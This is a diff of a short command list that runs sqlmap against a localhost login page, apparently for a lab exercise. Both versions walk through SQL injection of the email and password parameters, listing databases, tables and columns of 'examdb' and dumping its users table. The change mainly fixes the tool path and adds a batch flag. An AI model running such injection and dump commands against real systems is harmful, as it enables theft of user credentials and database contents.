@@ -1,6 +1,6 @@
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p "email,password" --batch
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -dbs
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -tables
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -T users -columns
-./sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -T users -dump
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p "email,password"
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password --batch
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -dbs --batch
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -tables --batch
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -T exams -columns --batch
+./sqlmap/sqlmap.py -u "http://localhost:8080/login.php?email=alice@example.com&password=pass" -p password -D examdb -T users -dump --batch
